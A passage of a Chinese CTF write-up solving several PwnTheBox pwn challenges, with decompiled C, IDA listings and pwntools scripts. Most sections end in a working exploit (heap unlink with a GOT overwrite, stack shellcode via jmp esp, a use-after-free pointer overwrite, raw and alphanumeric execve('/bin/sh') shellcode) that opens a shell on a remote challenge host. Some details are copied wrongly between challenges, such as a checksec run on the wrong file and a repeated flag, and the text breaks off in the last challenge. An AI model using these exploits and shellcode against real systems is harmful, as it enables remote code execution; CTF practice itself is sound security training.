双击`delete_heap()`函数查看详情，`free(heaparray[v1]);`将释放掉`heaparray[v1]`所对应的`chunk`，`heaparray[v1]=0LL;`将指针置为`0`，因此不存在`UAF`。

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));   // free(heaparray[v1]);
    *(&heaparray + v1) = 0LL;   // heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

此外，注意到`l33t()`函数能直接调用`cat /home/pwn/flag`，但是它会报错`cat: /home/pwn/flag: No such file or directory`。

```c
int l33t()
{
  return system("cat /home/pwn/flag");
}
```

如果程序开启了`PIE`保护的话，在每次加载程序时都变换加载地址，该程序`No PIE`说明未开启地址无关可执行。根据以上分析可知该程序的堆是存放在`.bss`段上的，且存在堆溢出，我们可以尝试修改`free`的`got`表，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10428`，发送`payload`即可得到`PTB{115d0d71-b9b7-4dcc-9df6-ced7635a87d1}`。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10428)
e = ELF('./easyheap')

def create(size,content):
    io.sendlineafter(b'Your choice :', b'1')
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap:')
    io.sendline(content)

def edit(index, size, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.recvuntil('Index :')
    io.sendline(str(index))
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap : ')
    io.sendline(content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.recvuntil('Index :')
    io.sendline(str(index))

heaparray_creater = 0x6020E0
system_plt = e.plt['system']
free_got = e.got['free']

# 先创建3个chunk
create(0x90,b'aaaa') #chunk0
create(0x90,b'bbbb') #chunk1
create(0x20,b'/bin/sh\x00') #chunk2

# 编辑chunk0 构造出一个fake_chunk, 用于在释放chunk1时方便chunk1和fake_chunk进行合并
fake_chunk = p64(0) + p64(0x91) + p64(heaparray_creater-0x18) + p64(heaparray_creater-0x10)
fake_chunk = fake_chunk.ljust(0x90, b'a')
fake_chunk += p64(0x90) + p64(0xa0)
edit(0,0x100,fake_chunk)
delete(1)
payload = p64(0)*3 +p64(free_got)
edit(0,0x20 ,payload)
# 将free_got修改成system_plt, 这样在执行delete()时真正执行的就是system
edit(0,8,p64(system_plt))
delete(2)

io.interactive()
```

------

### ♥ [b0verfl0w](https://ce.pwnthebox.com/challenges?type=4&id=1642)

先`file ./b0verfl0w `查看文件类型，再`checksec --file=./b0verfl0w `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./b0verfl0w          
./b0verfl0w: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./easyheap 
[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  return vul();
}
```

双击`vul()`函数继续审计源码，该函数中有个局部变量`s`是`char`型数组，`s`的长度是`32`字节，可用栈大小为`0x38`字节。`fgets()`函数读取输入到变量`s`时限制输入的大小为`50`字节，显然存在栈溢出漏洞。

```c
int vul()
{
  char s[32]; // [esp+18h] [ebp-20h] BYREF

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(s, 50, stdin);
  printf("Hello %s.", s);
  fflush(stdout);
  return 1;
}
```

`fgets()`只能输入`50`个字节，其中`padding`占了`0x20`个字节，`fake ebp`还需要`0x4`个字节覆盖到栈帧底部，`ret`还需要`0x4`个字节，实际剩下的就只有`0xa`个字节。我们可以这样来构造栈，在栈的初始位置写入一段`shellcode`，然后最后`0xa`个字节让程序跳转到栈的起始处执行`shellcode`。

![](https://paper.tanyaodan.com/PwnTheBox/1642/1.jpg)

注意到`Functions window`中有个`hint`函数，其汇编代码如下，可以看到`jmp esp`的地址是`0x8048504`，这就不需要用`ROPgadget`来获取`jmp esp`的地址啦。当`ret`指令是从段间转移的`call`指令进入的子程序中返回时，会修改`eip`和`esp`寄存器。所以当`ret`的地址被赋值为`0x8048504`时就会执行`jmp esp`，此时`esp = esp + 4`，`esp`寄存器指向`sub esp, 0x28; jmp esp`，同时`esp`寄存器中的数据出栈赋值给`eip`寄存器，`eip`寄存器也指向`sub esp, 0x28; jmp esp`，这样就可以劫持`esp`寄存器指向`shellcode`处，程序继续执行`jmp esp`，就会跳转到栈的起始处执行`shellcode`。

```assembly
.text:080484FD                 public hint
.text:080484FD hint            proc near
.text:080484FD ; __unwind {
.text:080484FD                 push    ebp
.text:080484FE                 mov     ebp, esp
.text:08048500                 sub     esp, 24h
.text:08048503                 retn
.text:08048503 hint            endp ; sp-analysis failed
.text:08048503
.text:08048504 ; ---------------------------------------------------------------------------
.text:08048504                 jmp     esp
.text:08048506 ; ---------------------------------------------------------------------------
.text:08048506                 retn
.text:08048507 ; ---------------------------------------------------------------------------
.text:08048507                 mov     eax, 1
.text:0804850C                 pop     ebp
.text:0804850D                 retn
.text:0804850D ; } // starts at 80484FD
```

编写`shellcode`来获取`system("/bin/sh")`以操控靶机。

```assembly
xor eax, eax    ; clear eax
xor edx, edx    ; clear edx
push edx        ; 将0入栈 标记了'/bin/sh'的结尾
push 0x68732f2f ; 将'/sh'的地址入栈 为了4字节对齐 传递的是'//sh', 这在execve()中等同于'/sh'
push 0x6e69622f ; 将'/bin'的地址入栈
mov ebx, esp    ; 此时esp指向'/bin/sh' 通过esp将字符串赋值给ebx
xor ecx, ecx    ; clear ecx
mov al, 0xb     ; eax置为execve()函数的中断号
int 0x80        ; 调用syscall()函数软中断
```

编写`shellcode`来获取`system("/bin/sh")`汇编代码所对应的机器码，`i386`架构下的`shellcode`一共有三种写法。

```python
shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode) # len(shellcode) = 23
# 以上代码等价于下面这行 不过下面这行更简洁 len(shellcode) = 21
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

shellcode = asm(shellcraft.sh()) # 一般情况下不用 太长啦 len(shellcode) = 44
```

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10461`，发送`payload`即可得到`PTB{986eef70-9609-4709-b34a-e07257c82b53}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10461)

shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode)
# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

jmp_esp = 0x8048504
sub_esp_jmp = asm('sub esp, 0x28; jmp esp')
payload = shellcode + (0x20-len(shellcode)+4)*b'a' + p32(jmp_esp) + sub_esp_jmp

io.sendlineafter("What's your name?", payload)
io.interactive()
```

------

### [baby rop 2](https://ce.pwnthebox.com/challenges?type=4&page=1&id=558)



### [uaf](https://ce.pwnthebox.com/challenges?id=559)

先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./hacknote            
./hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44ee75c492628b3691cdcdb07759e9bbe551644a, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./hacknote            
[*] '/home/tyd/ctf/pwn/pwnthebox/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`hacknote`，按`F5`反汇编源码并查看主函数。输入`1`增加节点，输入`2`删除节点，输入`3`打印节点。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[4]; // [esp+0h] [ebp-Ch] BYREF
  int *v5; // [esp+4h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v3 = atoi(buf);
      if ( v3 != 2 )
        break;
      del_note();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        print_note();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```

查看增加节点的函数`add_note()`，发现最多创建`5`个`chunk`，`notelist[i]`用来存放`chunk`的地址，`notelist`是存放在`.bss`段上的，申请了一个大小为`8`字节的`chunk`保存当前`chunk`的指针，然后再`malloc`用户申请的`chunk`。

`read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size)`用来向`chunk`中写入`size`大小的内容。

```c
int add_note()
{
  int result; // eax
  int v1; // esi
  char buf[8]; // [esp+0h] [ebp-18h] BYREF
  size_t size; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  result = count;
  if ( count > 5 )
    return puts("Full");
  for ( i = 0; i <= 4; ++i )
  {
    result = *((_DWORD *)&notelist + i);
    if ( !result )
    {
      *((_DWORD *)&notelist + i) = malloc(8u);
      if ( !*((_DWORD *)&notelist + i) )
      {
        puts("Alloca Error");
        exit(-1);
      }
      **((_DWORD **)&notelist + i) = print_note_content;
      printf("Note size :");
      read(0, buf, 8u);
      size = atoi(buf);
      v1 = *((_DWORD *)&notelist + i);
      *(_DWORD *)(v1 + 4) = malloc(size);
      if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )
      {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");
      read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);
      puts("Success !");
      return ++count;
    }
  }
  return result;
}
```

`del_note()`函数中，`free`释放掉相应的`chunk`后并没有将`chunk`的指针置为`0`，所以存在`uaf`漏洞。

```c
int del_note()
{
  int result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = *((_DWORD *)&notelist + v2);
  if ( result )
  {
    free(*(void **)(*((_DWORD *)&notelist + v2) + 4));
    free(*((void **)&notelist + v2));
    result = puts("Success");
  }
  return result;
}
```

`print_note()`函数可以用来输出`chunk`中的内容。

```c
int print_note()
{
  int result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = *((_DWORD *)&notelist + v2);
  if ( result )
    result = (**((int (__cdecl ***)(_DWORD))&notelist + v2))(*((_DWORD *)&notelist + v2));
  return result;
}
```

注意到程序中有个`magic()`函数地址为`0x8048945`。

```c
int magic()
{
  return system("/bin/sh");
}
```

我们可以利用`uaf`漏洞来修改`chunk`指针的内容从而调用`/bin/sh`，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10020`，发送`payload`即可得到`PTB{cb3bb65d-204d-45b7-a565-6553d0de729c}`。

```python
from pwn import *

def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Note size :', str(size))
    io.sendlineafter('Content :', content)

def free(index):
    io.sendlineafter('choice :', '2')
    io.sendlineafter('Index :', str(index))

def show(index):
    io.sendlineafter('choice :', '3')
    io.sendlineafter('Index :', str(index))

io = remote('redirect.do-not-trust.hacking.run', 10020)
magic_address = 0x8048945
add(0x20, b'fuck')
add(0x20, b'fuck')
free(0)
free(1)
add(0x8, p64(magic_address))
show(0)
io.interactive()
```

------

### [Shell 黑客 1](https://ce.pwnthebox.com/challenges?id=1007)

题目没有附件，`nc redirect.do-not-trust.hacking.run 10021`可以输入但是没有回显。结合题目描述：

> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！

直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。

```python
from pwn import *

context(arch = 'amd64', os = 'linux',log_level = 'debug')
io = remote('redirect.do-not-trust.hacking.run', 10021)
io.sendline(asm(shellcraft.sh()))
io.interactive()
```

------

### [bof](https://ce.pwnthebox.com/challenges?id=945)

先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./bof                 
./bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d52165d6e0b268def0e0344ffa9e9e5247f1a9e2, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./bof                 
[*] '/home/tyd/ctf/pwn/pwnthebox/bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开`bof`后按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  puts("Greetings! Have fun with Xp0int!");
  puts("Your name: ");
  read(0, &NAME, 0x18uLL);
  fun1();
  return 0;
}
```

`NAME`变量存放在`.bss`段上，程序存在栈溢出漏洞且未开启`NX`防护，可以通过`read()`函数向`.bss`段写入`0x18`字节的`shellcode`。

双击`NAME`变量可以看到其起始地址为`0x404070`。

```assembly
.bss:0000000000404070                 public NAME
.bss:0000000000404070 NAME            db    ? ;               ; DATA XREF: main+50↑o
.........
.bss:0000000000404087 _bss            ends
```

`fun1()`函数详情如下：

```c
ssize_t __fastcall fun1(__int64 a1, const char *a2)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("Well, %s this is a simple one.(*_*)\n", a2);
  return read(0, buf, 0x30uLL);
}
```

双击`buf`变量可以查看大致栈结构，我们需要`0x20`个字节来覆盖`padding`，`fake rbp`还需要`0x8`个字节覆盖到栈帧底部。

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 buf             db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`amd64`架构的`shellcode`汇编代码如下：

```assembly
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f ; 将'/bin/sh'传递给rdi
push rdi                  ; 将'/bin/sh'压入栈
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b                 ; 系统调用号
pop rax
syscall
```

然而它超过了`0x18`字节，科学上网找了个简短的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10025`，发送`payload`即可得到`PTB{ecfca74a-376c-4e71-8e09-da5cf5c3f024}`，提交即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10025)
address = 0x404070
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
print(len(asm(shellcode))) # 30 超过了0x18 重新写
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendline(shellcode)
payload = b'a'*(0x20+0x8)+p64(address)
io.sendline(payload)
io.interactive()
```

------

### [Getting Start](https://ce.pwnthebox.com/challenges?id=1697)

先`file ./task_gettingStart_ktQeERc  `查看文件类型，再`checksec --file=./task_gettingStart_ktQeERc  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./task_gettingStart_ktQeERc
./task_gettingStart_ktQeERc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./task_gettingStart_ktQeERc
[*] '/home/tyd/ctf/pwn/pwnthebox/task_gettingStart_ktQeERc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，双击`buf`变量可以查看栈结构。

注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 buf[3]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v5; // [rsp+28h] [rbp-18h]
  double v6; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  v5 = 0x7FFFFFFFFFFFFFFFLL;
  v6 = 1.797693134862316e308;
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("HuWangBei CTF 2018 will be getting start after %lu seconds...\n", 0LL);
  puts("But Whether it starts depends on you.");
  read(0, buf, 0x28uLL);
  if ( v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1 )
  {
    printf("HuWangBei CTF 2018 will be getting start after %g seconds...\n", v6);
    system("/bin/sh");
  }
  else
  {
    puts("Try again!");
  }
  return 0LL;
}
```

分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。

```assembly
-0000000000000040 ; D/A/*   : change type (data/ascii/array)
-0000000000000040 ; N       : rename
-0000000000000040 ; U       : undefine
-0000000000000040 ; Use data definition commands to create local variables and function arguments.
-0000000000000040 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0
-0000000000000040 ;
-0000000000000040
-0000000000000040                 db ? ; undefined
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038 var_38          dq ?
-0000000000000030 buf             dq ?
-0000000000000028 var_28          dq ?
-0000000000000020 var_20          dq ?
-0000000000000018 v5              dq ?
-0000000000000010 v6              dq ?
-0000000000000008 var_8           dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)

当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)

编写`Python`代码即可得到`PTB{4c092b9f-0176-442b-8afc-fd587f7c4a91}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10070)
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendline(payload)
io.interactive()
```

------

### [shellcode](https://ce.pwnthebox.com/challenges?id=1765)

先`file ./mrctf2020_shellcode `查看文件类型，再`checksec --file=./mrctf2020_shellcode `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./mrctf2020_shellcode
./mrctf2020_shellcode: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5024a9527dd620c442aaba45f15a2e9342d58ff, for GNU/Linux 3.2.0, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./mrctf2020_shellcode
[*] '/home/tyd/ctf/pwn/pwnthebox/mrctf2020_shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

使用`IDA pro 64bit`打开附件`mrctf2020_shellcode`，按`F5`反汇编源码失败，直接查看汇编代码。`buf`大小为`0x410`字节，而`read`函数读入到`buf`的限制大小为`0x400`字节，不存在栈溢出漏洞，但是足以系统调用`shell`啦。`jg`是如果`cmp`大于则跳转，`jl`是如果`cmp`小于则跳转，`jmp`是无条件跳转指令。

```assembly
.text:0000000000001155 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000001155                 public main
.text:0000000000001155 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000001155
.text:0000000000001155 buf             = byte ptr -410h
.text:0000000000001155 var_4           = dword ptr -4
.text:0000000000001155
.text:0000000000001155 ; __unwind {
.text:0000000000001155                 push    rbp
.text:0000000000001156                 mov     rbp, rsp
.text:0000000000001159                 sub     rsp, 410h
.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5
.text:0000000000001167                 mov     esi, 0          ; buf
.text:000000000000116C                 mov     rdi, rax        ; stream
.text:000000000000116F                 call    _setbuf
.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5
.text:000000000000117B                 mov     esi, 0          ; buf
.text:0000000000001180                 mov     rdi, rax        ; stream
.text:0000000000001183                 call    _setbuf
.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5
.text:000000000000118F                 mov     esi, 0          ; buf
.text:0000000000001194                 mov     rdi, rax        ; stream
.text:0000000000001197                 call    _setbuf
.text:000000000000119C                 lea     rdi, s          ; "Show me your magic!"
.text:00000000000011A3                 call    _puts
.text:00000000000011A8                 lea     rax, [rbp+buf]
.text:00000000000011AF                 mov     edx, 400h       ; nbytes
.text:00000000000011B4                 mov     rsi, rax        ; buf
.text:00000000000011B7                 mov     edi, 0          ; fd
.text:00000000000011BC                 mov     eax, 0
.text:00000000000011C1                 call    _read
.text:00000000000011C6                 mov     [rbp+var_4], eax
.text:00000000000011C9                 cmp     [rbp+var_4], 0
.text:00000000000011CD                 jg      short loc_11D6
.text:00000000000011CF                 mov     eax, 0
.text:00000000000011D4                 jmp     short locret_11E4
.text:00000000000011D6 ; ---------------------------------------------------------------------------
.text:00000000000011D6
.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j
.text:00000000000011D6                 lea     rax, [rbp+buf]
.text:00000000000011DD                 call    rax
.text:00000000000011DF                 mov     eax, 0
.text:00000000000011E4
.text:00000000000011E4 locret_11E4:                            ; CODE XREF: main+7F↑j
.text:00000000000011E4                 leave
.text:00000000000011E5                 retn
.text:00000000000011E5 ; } // starts at 1155
.text:00000000000011E5 main            endp
```

编写`Python`代码即可得到`PTB{983cfea6-e827-4ce1-8ae1-bd487168f519}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10116)
shellcode = asm('''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
''')
# shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()
```

------

### [number game](https://ce.pwnthebox.com/challenges?id=1774)

先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_number_game                                                              
./wustctf2020_number_game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ad95bd0bc056d1f68fc74a2a3f2cd7ce63ada796, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_number_game                                                 
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_number_game'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`查看函数详情：

```c
unsigned int vulnerable()
{
  int v1; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = 0;
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 || (v1 = -v1, v1 >= 0) )
    printf("You lose");
  else
    shell();
  return __readgsdword(0x14u) ^ v2;
}
```

当输入的数字`v1`是负数，且`v1`的相反数也是负数，才可以执行`shell`。`32`位系统`int`型取值范围是`[-2147483648, 2147483647]`。那这不是显然了吗？直接`nc`进去输入`-2147483647`就行啦。当然也可以编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10124`，发送`payload`即可得到`PTB{2cdb6e65-3494-4643-9d4a-3f08e76c1361}`，提交即可。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10124)
io.sendline(b'-2147483648')
io.interactive()
```

------

### [Shell 黑客 2](https://ce.pwnthebox.com/challenges?id=1008)

题目没有附件，`nc redirect.do-not-trust.hacking.run 10168`可以输入但是没有回显。结合题目描述：

> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！

直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限失败。利用`alpha3`进行编码生成一段没有坏字符的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10168)
shellcode = b'PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06'
io.send(shellcode)
io.interactive()
```

------

### [orw](https://ce.pwnthebox.com/challenges?id=1688)

先`file ./orw `查看文件类型，再`checksec --file=./orw `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./orw
./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
                                                                                                                          
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./orw
